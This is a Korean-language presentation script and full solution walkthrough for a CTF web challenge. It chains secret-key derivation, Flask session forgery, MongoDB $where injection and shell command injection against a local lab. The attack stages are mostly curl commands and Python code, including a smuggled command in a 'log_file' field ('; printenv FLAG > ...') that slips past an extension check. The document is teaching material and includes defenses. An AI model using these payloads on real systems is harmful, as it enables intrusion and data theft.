# CTF Challenge 시연 대본
## Legacy Microservice Exploitation V6.1

**난이도:** DreamHack Level 7-8
**예상 풀이 시간:** 90-110분
**카테고리:** Web Exploitation, NoSQL Injection, RCE

---

## 🎯 시연 개요 (5분)

### 1. 문제 소개 (1분)

안녕하세요. 오늘 제가 시연할 CTF 문제는 "Legacy Microservice Exploitation V6.1"입니다.

이 문제는 **레거시 마이크로서비스의 연쇄 취약점**을 활용하여 FLAG를 획득하는 고난이도 웹 해킹 문제입니다.

**핵심 특징:**
- ✅ **현실적인 시나리오**: 실제 환경에서 발생 가능한 취약점 패턴
- ✅ **7단계 공격 체인**: 각 단계가 논리적으로 연결
- ✅ **AI 저항성**: 단순 패턴 매칭이 아닌 논리적 사고 필요
- ✅ **완전 안정성**: 네트워크/시간 의존성 없음

---

### 2. 취약점 체인 다이어그램 (1분)

```
[1] Service Discovery (서비스 발견)
        ↓
[2] Information Gathering (정보 수집)
        ↓
[3] Secret Key Derivation (비밀키 유추)
        ↓
[4] Session Forgery (세션 위조)
        ↓
[5] Permission Escalation (권한 상승)
        ↓
[6] NoSQL Injection (DB 조작)
        ↓
[7] Command Injection & RCE (원격 명령 실행)
        ↓
    🚩 FLAG 획득
```

각 단계는 **독립적으로 검증 가능**하며, 참가자는 단계별로 진행하면서 **성취감**을 느낄 수 있습니다.

---

### 3. 기술 스택 (30초)

**Backend:**
- Python Flask (web framework)
- MongoDB 4.4 (NoSQL database)
- Gunicorn + gevent (production server)

**Deployment:**
- Docker + Docker Compose
- 격리된 네트워크 환경
- 환경 변수 기반 설정

---

## 🔥 공격 시연 (15분)

### STAGE 1: Service Discovery (1분)

**목표:** 레거시 서비스 발견하기

```bash
# 1. robots.txt 확인
curl http://localhost:5000/robots.txt
```

**참가자 관찰:**
```
Allow: /api/v2/          ← 여기가 진입점!
Disallow: /admin         ← Red herring (함정)
Disallow: /api/v1/       ← 레거시 API 힌트
```

**설명:** 참가자는 robots.txt를 통해 `/api/v2/`가 허용된 것을 보고, 여기서 시작해야 함을 알게 됩니다.

```bash
# 2. 서비스 목록 조회
curl http://localhost:5000/api/v2/services | python -m json.tool
```

**참가자 발견:**
```json
{
  "name": "legacy",
  "full_name": "legacy-auth-service",
  "version": "2.1.0",
  "build": "20240115",
  "status": "deprecated",
  "salt_prefix": "las2024"  ← 중요 힌트!
}
```

**강조 포인트:**
- "deprecated" 상태 → 보안 취약 가능성
- `salt_prefix` 정보 노출 → 나중에 사용됨

---

### STAGE 2-3: Information Gathering & Secret Derivation (3분)

**목표:** 분산된 힌트를 모아 SECRET_KEY 유추하기

```bash
# 1. 레거시 엔드포인트 열거
curl http://localhost:5000/api/v2/services/legacy/endpoints | python -m json.tool
```

**발견:**
```json
{
  "path": "/api/legacy/config_backup",
  "description": "Configuration backup utility"
}
```

```bash
# 2. 설정 백업 조회 (핵심!)
curl http://localhost:5000/api/legacy/config_backup | python -m json.tool
```

**참가자가 발견하는 중요 정보:**
```json
{
  "session": {
    "algorithm": "HMAC-SHA256",
    "sample_generation": "SHA256(service-build-salt)[:32]",
    "note": "Key is deterministically generated from service info"
  },
  "build": {
    "service_id": "legacy-auth-service",
    "version": "2.1.0",
    "build_date": "20240115"
  }
}
```

**강조:** "deterministically generated" → 유추 가능!

```bash
# 3. 헤더에서 salt 확인
curl -I http://localhost:5000/health | grep X-Service-Salt
```

**출력:**
```
X-Service-Salt: las2024
```

**이제 SECRET_KEY를 유추합니다:**

**💡 중요: 공식 분석**
힌트: `SHA256(service-build-salt)[:32]`

여기서 주의할 점:
- "service-build-salt"는 **변수 패턴**입니다
- service = `legacy-auth-service`
- build = `20240115`
- salt = `las2024`
- **version은 포함되지 않습니다!** (이게 핵심 트릭)

```python
import hashlib

# 수집한 정보 조합
# 주의: version은 제외!
combination = "legacy-auth-service-20240115-las2024"
secret_key = hashlib.sha256(combination.encode()).hexdigest()[:32]

print(f"SECRET_KEY: {secret_key}")
# 출력: b1c1085856ff83572ee849f408d1e057
```

**강조 포인트:**
- 힌트가 3곳에 분산 (services, config_backup, header)
- 논리적 추론 필요 → AI가 쉽게 풀기 어려움
- version을 넣으면 틀림! (많은 참가자가 실수하는 부분)

---

### STAGE 4-5: Session Forgery & Permission Escalation (3분)

**목표:** Guest → Admin 권한 상승

```bash
# 1. Guest 세션 생성 (비교용)
curl -X POST http://localhost:5000/api/auth/guest
```

**응답:**
```json
{
  "role": "guest",
  "permissions": ["read"]
}
```

**설명:** Guest는 `read` 권한만 있습니다. Admin이 되려면 세션을 위조해야 합니다.

```python
# 2. Admin 세션 위조
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import hashlib

app = Flask(__name__)
app.secret_key = "b1c1085856ff83572ee849f408d1e057"  # 유추한 SECRET_KEY

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

admin_session = {
    '_permanent': True,
    'role': 'admin',
    'user': 'admin',
    'permissions': ['read', 'write', 'migrate']  # ← migrate 권한 추가!
}

admin_cookie = session_serializer.dumps(admin_session)
print(f"Admin cookie: {admin_cookie}")
```

```bash
# 3. Admin 권한 테스트
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**성공 응답:**
```json
{
  "status": "migration complete",
  "count": 0,
  "message": "No records migrated"
}
```

**강조 포인트:**
- Flask secret key만 있으면 임의 세션 생성 가능
- Permissions 기반 권한 시스템 → `migrate` 권한 필요

---

### STAGE 6: NoSQL Injection (3분)

**목표:** MongoDB $where 연산자로 모든 사용자 조회

```bash
# 1. 기본 NoSQL Injection
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"}
  }'
```

**응답:**
```json
{
  "count": 3,
  "message": "3 records processed"
}
```

**설명:** 3명만 조회됨. 왜? → 기본적으로 `active=True`인 사용자만 조회되기 때문

**💡 핵심 발견:**
참가자는 여기서 "왜 3명만 나오지?"라고 의문을 가져야 합니다.
- DB에 사용자가 더 있을 수 있다
- inactive 사용자가 숨겨져 있을 가능성
- 옵션 파라미터를 찾아봐야 함

```bash
# 2. include_inactive 옵션 추가
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {"include_inactive": true}
  }'
```

**응답:**
```json
{
  "count": 4,
  "message": "4 records processed"
}
```

**설명:** 이제 4명! 비활성 사용자 1명 추가로 발견됨.

```bash
# 3. RCE 트리거 조건: limit >= 100
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "include_inactive": true,
      "limit": 100
    }
  }'
```

**응답 (변화 관찰!):**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**🔍 미묘한 변화:**
- 이전: `"message": "4 records processed"` 포함
- 현재: message 필드 없음
- → 다른 코드 경로를 탔다! RCE가 트리거 가능한 상태

**강조 포인트:**
- `$where` → JavaScript 실행 → 위험!
- 참가자가 조건을 하나씩 발견해야 함
- limit >= 100 → 대량 마이그레이션 시나리오

---

### STAGE 7: Command Injection & RCE (4분)

**목표:** FLAG 환경 변수 읽기

```bash
# 1. 명령 주입 시도 - FLAG 직접 출력 시도 (실패)
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "include_inactive": true,
      "limit": 100
    },
    "log_file": "/tmp/test.log; printenv FLAG"
  }'
```

**에러:**
```json
{
  "error": "Invalid file extension"
}
```

**설명:** 전체 경로가 `.log` 또는 `.txt`로 끝나야 함!

**💭 참가자 사고 과정:**
```
문제: "printenv FLAG"는 .log/.txt로 끝나지 않음
해결 방법:
1. /tmp/x.log; printenv FLAG.txt  ← 이건 작동할까?
2. /tmp/x.log; printenv FLAG > /app/static/flag.txt  ← 이게 정답!
```

```bash
# 2. Static 디렉토리로 FLAG 출력 (성공!)
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "include_inactive": true,
      "limit": 100
    },
    "log_file": "/tmp/x.log; printenv FLAG > /app/static/flag.txt"
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4,
  "log_output": "Migration started\nMigration completed\n"
}
```

**FLAG 획득!**
```bash
# 웹에서 FLAG 읽기
curl http://localhost:5000/static/flag.txt
```

**출력:**
```
MSG{test_flag_here}
```

**강조 포인트:**
- 세미콜론(;) 허용 → 명령 체이닝 가능
- Extension 검증 취약 → 전체 문자열만 체크
- PATH traversal 검증 없음 → /app/static 접근 가능
- FLAG는 환경 변수에 저장됨

---

### 대안 방법: 직접 출력 모드 (BLIND_RCE=false일 때)

환경 설정에 따라 출력을 직접 볼 수 있는 경우:

```bash
# log_output 필드에서 직접 FLAG 확인
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -b "session=${admin_cookie}" \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "include_inactive": true,
      "limit": 100
    },
    "log_file": "/tmp/x.log; echo test.txt"
  }' | python -m json.tool
```

**참고:** 마지막 명령어도 .txt로 끝나야 하므로 `echo test.txt`처럼 작성

---

## 📊 보안 교훈 & 방어 방법 (3분)

### 발견된 취약점들

| 취약점 | 심각도 | CVSS | 설명 |
|--------|--------|------|------|
| Information Disclosure | 중 | 6.5 | Secret 생성 공식 노출 |
| Weak Secret Generation | 높음 | 8.1 | 예측 가능한 secret key |
| Session Forgery | 치명적 | 9.8 | 임의 권한 획득 |
| NoSQL Injection | 치명적 | 9.8 | $where 연산자 악용 |
| Command Injection | 치명적 | 10.0 | RCE 달성 |

### 방어 방법

**1. Secret Key 관리**
```python
# ❌ 나쁜 예
SECRET_KEY = hashlib.sha256(b"predictable-data").hexdigest()[:32]

# ✅ 좋은 예
import secrets
SECRET_KEY = secrets.token_hex(32)  # 암호학적으로 안전한 난수
```

**2. NoSQL Injection 방어**
```python
# ❌ 나쁜 예
db.users.find(user_input)  # 직접 사용

# ✅ 좋은 예
# $where 연산자 완전 차단
if '$where' in str(user_input):
    raise ValueError("$where operator not allowed")

# 또는 허용 리스트만 사용
allowed_operators = ['$eq', '$ne', '$gt', '$lt', '$in']
for key in user_input.keys():
    if key.startswith('$') and key not in allowed_operators:
        raise ValueError("Dangerous operator detected")
```

**3. Command Injection 방어**
```python
# ❌ 나쁜 예
os.system(f"echo '{user_input}' > file.log")

# ✅ 좋은 예
import subprocess
import shlex

# 방법 1: shlex.quote로 이스케이핑
safe_input = shlex.quote(user_input)

# 방법 2: shell=False 사용 (최선)
subprocess.run(['echo', user_input], shell=False)
```

**4. Permissions 검증**
```python
# ❌ 나쁜 예 (클라이언트에서 제어)
permissions = session.get('permissions', [])

# ✅ 좋은 예 (서버에서 검증)
user = db.users.find_one({'username': session.get('user')})
permissions = user.get('permissions', [])
```

---

## 🎓 참가자 학습 경로 (2분)

### 초급 참가자 (30-40%)
1. robots.txt 확인 → 서비스 발견 ✅
2. API 엔드포인트 열거 ✅
3. **막히는 지점:** Secret key 유추 (version 포함 여부)
4. **힌트 필요:** "sample_generation 힌트를 정확히 따라해보세요"

### 중급 참가자 (40-50%)
1. 정보 수집 완료 ✅
2. Secret key 유추 성공 ✅
3. Session forgery 성공 ✅
4. **막히는 지점:** NoSQL injection으로 3명만 나오는 이유
5. **힌트 필요:** "비활성 사용자도 있을 수 있습니다"

### 고급 참가자 (10-20%)
1. NoSQL injection으로 4명 발견 ✅
2. RCE 트리거 조건 발견 (limit >= 100) ✅
3. **막히는 지점:** Extension 체크 우회
4. **힌트 필요:** "전체 명령어가 .txt로 끝나야 합니다"
5. FLAG 획득 성공! 🎉

### 힌트 시스템 (선택사항)

**힌트 1 (30분 후):**
> "Secret key는 서비스 메타데이터로부터 생성됩니다. sample_generation 필드를 정확히 따라해보세요. 'service-build-salt' 패턴에서 각 단어가 무엇을 의미하는지 생각해보세요."

**힌트 2 (60분 후):**
> "NoSQL injection이 성공했는데 사용자가 3명만 나오나요? DB에 inactive 상태인 사용자가 더 있을 수 있습니다. options 파라미터를 확인해보세요."

**힌트 3 (90분 후):**
> "Command injection 필터를 우회하려면 전체 경로가 .txt 또는 .log로 끝나야 합니다. 세미콜론 뒤의 명령어까지 포함해서요."

---

## 🔧 기술적 하이라이트 (1분)

### V6.1의 핵심 설계

**AI 저항성 향상:**
- ✅ SECRET_KEY 유도 시 **version 포함 여부**가 트릭
  - 대부분의 AI는 "service-build-version-salt"로 추론
  - 실제 정답은 "service-build-salt" (version 제외)
- ✅ 분산 힌트 시스템 (3곳에서 수집 필요)
- ✅ 자연스러운 옵션명 (`include_inactive`, `limit`)
  - 일반적인 API 패턴이라 AI가 특정하기 어려움

**완전한 안정성:**
- ✅ MongoDB JavaScript 자동 검증
- ✅ Healthcheck로 컨테이너 상태 모니터링
- ✅ 네트워크/시간 의존성 완전 제거

**현실성:**
- 각 취약점이 실제 사례 기반
- 레거시 시스템에서 실제로 발견 가능한 패턴
- 7단계 체인이 논리적으로 연결됨

---

## 🚀 배포 및 관리 (1분)

### 빠른 배포

```bash
# 1. 환경 설정
cp .env.example .env
nano .env  # SECRET_KEY, FLAG 설정

# 2. 컨테이너 실행
docker-compose up -d

# 3. 상태 확인
docker-compose ps
curl http://localhost:5000/health
```

### 환경 변수 설명

```bash
# .env 파일
SECRET_KEY=b1c1085856ff83572ee849f408d1e057  # ← 반드시 이 값 사용!
FLAG=MSG{your_custom_flag_here}
CTF_PORT=5000
```

**⚠️ 중요:** SECRET_KEY를 다른 값으로 변경하면 문제가 풀리지 않습니다!

---

## ❓ 질의응답 준비

### 예상 질문 1: "왜 Flask secret을 유추 가능하게 했나요?"

**답변:**
"현실에서도 개발자가 편의를 위해 예측 가능한 secret을 사용하는 경우가 있습니다.
특히 레거시 시스템에서는 'SHA256(서비스명-날짜-salt)' 같은 패턴으로 일관성 있게
secret을 생성하는 경우가 있죠. 이 문제는 그러한 잘못된 관행이 어떤 결과를
초래하는지 보여주기 위함입니다. 또한 정보 수집 → 유추 → 공격이라는
논리적 사고 과정을 훈련시키기 위한 설계입니다."

### 예상 질문 2: "$where 연산자는 왜 위험한가요?"

**답변:**
"MongoDB의 $where 연산자는 JavaScript 코드를 직접 실행하기 때문에 매우 위험합니다.
공격자가 임의의 JavaScript를 실행할 수 있으면:
1. 모든 데이터베이스 접근 가능
2. 조건문 우회
3. 성능 저하 공격 (DoS)
4. 서버 측 로직 파악 가능

MongoDB 4.4 이후에는 보안상의 이유로 JavaScript 기능이 일부 제한되었지만,
레거시 시스템이나 잘못 설정된 환경에서는 여전히 활성화되어 있는 경우가 많습니다."

### 예상 질문 3: "실제 환경에서 이런 취약점이 발견될 수 있나요?"

**답변:**
"네, 각 취약점은 실제 발견된 사례를 기반으로 설계했습니다:

- **Secret key 유추**: GitHub에 노출된 설정 파일에서 빈번히 발견됨
- **Session forgery**: Flask/Express 앱의 잘못된 secret 관리 (CVE 다수 존재)
- **NoSQL injection**: OWASP Top 10에 포함, 실제 침해 사고 다수
- **Command injection**: 로그 파일 관리, 백업 도구에서 빈번히 발견

차이점은 실제 환경에서는 보통 1-2개의 취약점만 연결되는 반면,
이 문제에서는 **7단계 모두**를 연결해야 한다는 점입니다.
이는 참가자의 끈기와 체계적 사고를 시험하기 위함입니다."

### 예상 질문 4: "왜 version을 SECRET_KEY 생성에서 제외했나요?"

**답변:**
"이는 의도적인 난이도 조절입니다. 힌트에 'service-build-salt'라고 명시되어 있고,
config_backup에 version 정보도 제공되기 때문에, 많은 참가자가 자연스럽게
version을 포함시킵니다. 하지만:

1. sample_generation 힌트를 **정확히** 따르면 version이 없음
2. 소프트웨어 개발에서 version은 자주 변경되므로, secret key 생성에
   포함시키지 않는 것이 더 현실적
3. 이 미묘한 차이가 초급자와 고급자를 구분하는 포인트

참가자가 시행착오를 통해 정확한 패턴을 찾아가는 과정 자체가 학습입니다."

---

## 📝 시연 전 체크리스트

- [ ] Docker 컨테이너 실행 중 (`docker-compose ps`)
- [ ] SECRET_KEY가 `b1c1085856ff83572ee849f408d1e057`로 설정됨 (.env 확인)
- [ ] FLAG가 `.env`에 설정됨
- [ ] Health check 정상 응답 (`curl http://localhost:5000/health`)
- [ ] 브라우저 탭 준비:
  - [ ] `http://localhost:5000`
  - [ ] GitHub repository
  - [ ] SOLUTION_WALKTHROUGH.md
- [ ] 터미널 2개 준비 (curl 실행 / Python 스크립트 실행)
- [ ] Python 환경 확인 (flask, requests, itsdangerous 설치됨)

---

## 🎬 시연 타임라인

| 시간 | 내용 | 비고 |
|------|------|------|
| 0:00 - 1:00 | 문제 소개 | 난이도, 특징 설명 |
| 1:00 - 2:00 | 공격 체인 다이어그램 | 전체 흐름 설명 |
| 2:00 - 3:00 | STAGE 1-2 시연 | Service discovery |
| 3:00 - 6:00 | STAGE 3 시연 | Secret derivation (version 트릭 강조!) |
| 6:00 - 9:00 | STAGE 4-5 시연 | Session forgery |
| 9:00 - 12:00 | STAGE 6 시연 | NoSQL injection (3명→4명 차이 강조) |
| 12:00 - 16:00 | STAGE 7 시연 | Command injection |
| 16:00 - 17:00 | FLAG 획득 시연 | Static 디렉토리 방법 |
| 17:00 - 20:00 | 보안 교훈 | 방어 방법 |
| 20:00 - 23:00 | 기술적 세부사항 | V6.1 설계 철학 |
| 23:00 - 25:00 | Q&A | 질의응답 |

**총 시연 시간: 약 25분**

---

## 🏆 성공 기준

참가자가 이 문제를 성공적으로 해결했다면:

✅ **기술적 능력:**
- API 탐색 및 정보 수집
- 암호화 알고리즘 이해 (SHA256)
- Flask session 구조 이해
- NoSQL injection 이해
- Command injection 이해

✅ **사고 능력:**
- 분산된 힌트 통합
- 패턴 인식 및 유추
- 시행착오를 통한 학습
- 논리적 체인 구성

✅ **실전 능력:**
- 제한된 정보로 문제 해결
- 에러 메시지 활용
- 우회 기법 개발

---

**시연 성공을 기원합니다! 🎉**

**연락처:**
- GitHub Issues: 문제 보고 및 피드백
- 문서: SOLUTION_WALKTHROUGH.md 참고
